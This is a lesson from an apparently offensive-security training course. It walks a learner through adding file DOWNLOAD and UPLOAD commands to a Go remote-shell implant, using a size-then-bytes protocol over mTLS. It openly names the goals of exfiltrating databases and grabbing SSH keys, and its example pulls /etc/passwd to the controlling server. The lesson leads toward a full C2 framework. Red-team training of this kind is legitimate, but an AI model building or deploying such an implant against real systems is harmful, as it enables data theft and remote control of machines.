# L19: File Transfer

L18 gives you remote shell execution.
But shell output is text.
You need to move binary files: exfiltrate a database, upload a tool, grab SSH keys.
This exercise adds DOWNLOAD and UPLOAD commands using a size-then-bytes protocol.

## Size-then-bytes

The same pattern as HTTP Content-Length and SCP.
Before sending file data, send the size as a decimal number on its own line.
The receiver reads that line, parses the number, then reads exactly that many bytes.

```text
  DOWNLOAD /etc/hostname
  ---
  Server reads:

  "12\n"              <- size line (decimal bytes, newline-terminated)
  "rklings-vm\n"      <- exactly 12 bytes of file data

  UPLOAD /tmp/payload 5
  ---
  Agent reads:

  Server sends 5 raw bytes after the command line.
  Agent writes them to /tmp/payload.
```

No base64, no encoding.
TLS handles framing and integrity.
`io.LimitReader` prevents reading past the boundary.

## DOWNLOAD

The server sends `DOWNLOAD <path>`.
The agent opens the file, gets its size with `os.Stat`, writes the size line, then copies the file bytes.

```text
  Server                         Agent
    |                              |
    |--- "DOWNLOAD /etc/pass" --->|
    |                              |  f = os.Open("/etc/passwd")
    |                              |  info = f.Stat()
    |<-- "1247\n" ----------------|  size line
    |<-- [1247 bytes] ------------|  io.Copy(conn, f)
    |                              |
```

If the file does not exist, respond with `ERR` and no size line.

## UPLOAD

The server sends `UPLOAD <path> <size>`, then immediately sends the raw bytes.
The agent parses the path and size from the command, creates the file, and reads exactly size bytes into it.

```text
  Server                         Agent
    |                              |
    |--- "UPLOAD /tmp/x 13\n" --->|
    |--- [13 bytes] ------------->|  io.Copy(f, io.LimitReader(conn, 13))
    |                              |  f.Close()
    |<-- "OK\n" -----------------|
    |                              |
```

`io.LimitReader(conn, size)` wraps the connection so that at most `size` bytes
are read.
This is critical: without it, the agent would consume the next command line as
file data.

## You write

`main.go` (~130 lines):

- Everything from L18 (mTLS, dispatch, EXEC)
- `handleDownload`: os.Open, Stat for size, write size line, io.Copy
- `handleUpload`: parse path and size from arg, os.Create, io.Copy with LimitReader

## API

```go
import "io"

// DOWNLOAD: send file
f, err := os.Open(path)
info, err := f.Stat()
fmt.Fprintf(conn, "%d\n", info.Size())
io.Copy(conn, f)

// UPLOAD: receive file
r := io.LimitReader(conn, size)
f, err := os.Create(path)
io.Copy(f, r)
```

## The trap

UPLOAD size is part of the command line, not a separate line.
`UPLOAD /tmp/x 13` means: path is `/tmp/x`, size is `13`.
Parse both from the arg string before reading bytes.
If you read a line to get the size, you have already consumed part of the file data.

Also: `bufio.Scanner` buffers ahead.
After the scanner reads the UPLOAD command line, the file bytes are already in
the scanner's buffer, not in the raw connection.
You must read the file data from the scanner's underlying buffered reader, or
switch to `bufio.NewReader` for the connection and use `ReadString('\n')` for
command lines instead of a scanner.

## Test it

```
$ rklings run l19
```

The lab server shows download and upload buttons.

```
server> DOWNLOAD /etc/hostname
[received 12 bytes: "rklings-vm\n"]
server> UPLOAD /tmp/marker 11
[sent: "hello world"]
server> EXEC cat /tmp/marker
agent:  hello world
```

## Validate

```
$ rklings validate l19
  [+] agent connects over mTLS
  [+] DOWNLOAD /etc/hostname returns correct contents
  [+] DOWNLOAD sends correct size header
  [+] UPLOAD writes file with correct contents
  [+] PING and EXEC still work
  PASS
```

## Next

You have a complete remote operations agent: dispatch, shell, file transfer.
M02 integrates everything into a full C2 with an operator TUI.
